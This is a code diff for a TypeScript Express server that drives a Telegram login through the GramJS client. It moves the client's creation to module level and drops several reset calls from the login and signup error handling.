@@ -28,7 +28,9 @@ let password;
 let isCodeViaApp = false;
 const apiCredentials = { apiId: apiId, apiHash: apiHash }
 const stringSession = new StringSession("");
-let client;
+const client = new TelegramClient(stringSession, apiId, apiHash, {
+    connectionRetries: 5,
+});
 let inProcess = true;
 
 async function fetchWithTimeout(resource, options = { timeout: undefined }, sendErr = true) {
@@ -64,9 +66,7 @@ app.get('/login', async (req, res, next) => {
 }, async (req, res) => {
     if (inProcess) {
         inProcess = false;
-        client = new TelegramClient(stringSession, apiId, apiHash, {
-            connectionRetries: 5,
-        });
+
         setTimeout(async () => {
             await restAcc();
         }, 180000)
@@ -137,7 +137,6 @@ async function trySgnup(phoneNum: string) {
         if (typeof phoneNumber !== "function") {
             throw err;
         }
-        await restAcc();
         const shouldWeStop = false//await authParams.onError(err);
         if (shouldWeStop) {
             throw new Error("AUTH_USER_CANCEL");
@@ -147,7 +146,6 @@ async function trySgnup(phoneNum: string) {
 
 async function restAcc() {
     await client?.destroy();
-    client = undefined;
     phoneCode = undefined;
     phoneNumber = undefined;
     inProcess = true;
@@ -180,7 +178,6 @@ async function login() {
         }
     } catch (err: any) {
         console.log(err);
-        await restAcc();
         if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
             return client.signInWithPassword(apiCredentials, { password: () => Promise.resolve(password), onError: (err) => console.log(err) });
         } else {
